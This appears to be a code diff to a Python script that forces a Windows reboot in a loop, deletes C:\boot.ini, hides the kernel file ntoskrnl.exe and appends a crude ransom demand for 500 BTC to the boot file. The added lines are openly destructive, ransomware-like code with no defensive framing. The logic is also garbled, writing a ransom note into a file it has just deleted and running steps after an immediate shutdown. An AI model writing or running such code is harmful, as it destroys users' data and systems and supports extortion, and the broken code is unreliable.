@@ -12,9 +12,17 @@ while True:
         os.system("shutdown  /r  /t 0")
 
         # Corrupt the boot menu
-        os.system("del C:\boot.ini")
+        os.system("del C:\\boot.ini")
+        os.system("attrib +h C:\\Windows\\System32\\drivers\\ntoskrnl.exe")
 
-        # Prevent the PC from turning back on
-        os.system("attrib +h C:\Windows\System32\drivers\ntoskrnl.exe")
+        # Save a copy of the corrupted boot menu
+        with open("C:\\corrupted_boot_menu.txt", "w") as f:
+            f.write(str(subprocess.check_output(["dir", "boot.ini"])))
+
+        # Display the ransom demand in the boot menu
+        with open("C:\\boot.ini", "a") as f:
+            f.write("\nRansom Demand: Your PC has been fucked. Pay 500 BTC to 'adfsjfdjsafjsd' and enter the key below:\n")
+            f.write(f"Enter the key: ")
+
     except Exception as e:
         print(f"An error occurred: {e}")
